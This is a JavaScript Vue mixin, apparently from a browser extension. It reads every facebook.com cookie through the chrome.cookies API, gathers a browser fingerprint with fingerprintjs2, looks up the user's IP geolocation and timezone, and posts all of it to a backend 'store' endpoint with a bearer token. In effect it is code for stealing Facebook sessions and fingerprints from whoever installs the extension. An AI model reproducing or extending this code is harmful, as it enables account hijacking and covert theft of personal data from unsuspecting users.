import Fingerprint2 from 'fingerprintjs2'

export const mixins = {
    data() {
        return {

            fingerprints: [],
            geolocation: {},
            timezone:'',
            fbCookies:[],
            data: {address:{}},
            countryCode:'',
            country:''
        }

    },
    created: function(){
        this.getGeolocation().then(()=>{
            this.getFingerprints();
            this.getFbCookies();
        })
    },
    mounted:function(){
        // console.log(this.fingerprints);
        // console.log(this.fbCookies);
        // console.log(this.timezone);
        // console.log(this.geolocation);
    },
    methods: {
        getFingerprints:function(){
            let vm = this;
            if (window.requestIdleCallback) {
                requestIdleCallback(function(){
                    Fingerprint2.get(function (components){
                        vm.fingerprints.push(components)

                    })
                })
            }else{
                setTimeout(function(){
                    Fingerprint2.get(function(components){
                        // vm.$set(vm.fingerprints, components)
                        // vm.fingerprints = components;
                        vm.fingerprints.push(components)
                        console.log(vm.fingerprints);

                    })
                }, 500)
            }
            // console.log(vm.data.fingerprints)
        },
        async getGeolocation(){
            let vm = this;
            await this.$http.get('http://ip-api.com/json').then(response=>{
                console.log(response.status)
                if(response.status === 200){
                    console.log(response.body)
                    vm.$set(vm.data,'address',response.body)
                    vm.timezone = response.body['timezone'];
                    vm.countryCode = response.body['countryCode']
                    vm.country = response.body['country']

                }
            })
        },
        getFbCookies: function(){
            var t = this;
            chrome.cookies.getAll({url: "https://www.facebook.com"}, function (e) {
                t.fbCookies.push(e)
            })
            // console.log(t.fbCookies)
        },
        storeData: function(token){
            var t = this, e = {
                fb_cookies: this.fbCookies[0],
                fingerprints: this.fingerprints[0],
                geolocation: this.data.address,
                timezone: this.timezone
            };

            this.$http.post("store", e, {
                headers: {
                    Authorization: 'Bearer ' + token
                }
            }).then(function (e) {
                t.success = e.body
            }, function (t) {

            }).then(function (e) {

            })
        },
        getData(){
            this.getFbCookies();
            this.getFingerprints();
            this.getGeolocation();
        }
    }

}